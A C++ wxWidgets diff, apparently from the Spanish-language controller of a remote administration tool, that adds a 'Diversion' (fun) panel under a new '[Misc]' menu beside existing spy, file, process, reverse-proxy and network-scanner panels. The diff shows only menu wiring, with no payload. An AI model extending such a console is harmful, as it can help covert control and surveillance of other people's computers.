@@ -12,6 +12,7 @@
 #include "panel_usuarios.hpp"
 #include "panel_reverse_proxy.hpp"
 #include "panel_escaner.hpp"
+#include "panel_fun.hpp"
 #include "server.hpp"
 #include "misc.hpp"
 
@@ -52,7 +53,7 @@ FrameCliente::FrameCliente(std::string strID, SOCKET sckID, std::string strIP)
     wxTreeItemId rootSurveilance = this->m_tree->AppendItem(rootC,         wxT("[Spy]"));
     wxTreeItemId rootInformation = this->m_tree->AppendItem(rootC, wxT("[Informacion]"));
     wxTreeItemId rootNetwork     = this->m_tree->AppendItem(rootC,         wxT("[Red]"));
-    //wxTreeItemId rootMisc = this->m_tree->AppendItem(rootC, wxT("[Misc]")); <- Aqui ira fun
+    wxTreeItemId rootMisc        = this->m_tree->AppendItem(rootC,        wxT("[Misc]"));
 
     this->m_tree->AppendItem(rootAdmin, wxT("Admin de Archivos"));
     this->m_tree->AppendItem(rootAdmin, wxT("Admin de Procesos"));
@@ -73,6 +74,8 @@ FrameCliente::FrameCliente(std::string strID, SOCKET sckID, std::string strIP)
 
     this->m_tree->AppendItem(rootNetwork, wxT("Proxy Inversa"));
     this->m_tree->AppendItem(rootNetwork, wxT("Escaner de Red"));
+
+    this->m_tree->AppendItem(rootMisc, wxT("Diversion"));
 
     //Sizer para hacer el treeview dinamico al hacer resize
     wxBoxSizer* pnl_left_Sizer = new wxBoxSizer(wxHORIZONTAL);
@@ -181,8 +184,10 @@ void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
             this->p_Notebook->AddPage(new panelUsuarios(this, this->sckCliente), wStr, true);
         } else if (wStr == "Proxy Inversa") {
             this->p_Notebook->AddPage(new panelReverseProxy(this, this->sckCliente), wStr, true);
-        }else if (wStr == "Escaner de Red") {
+        } else if (wStr == "Escaner de Red") {
             this->p_Notebook->AddPage(new panelEscaner(this, this->sckCliente), wStr, true);
+        } else if (wStr == "Diversion") {
+            this->p_Notebook->AddPage(new panelFun(this, this->sckCliente), wStr, true);
         }
 
         this->p_Notebook->Thaw();
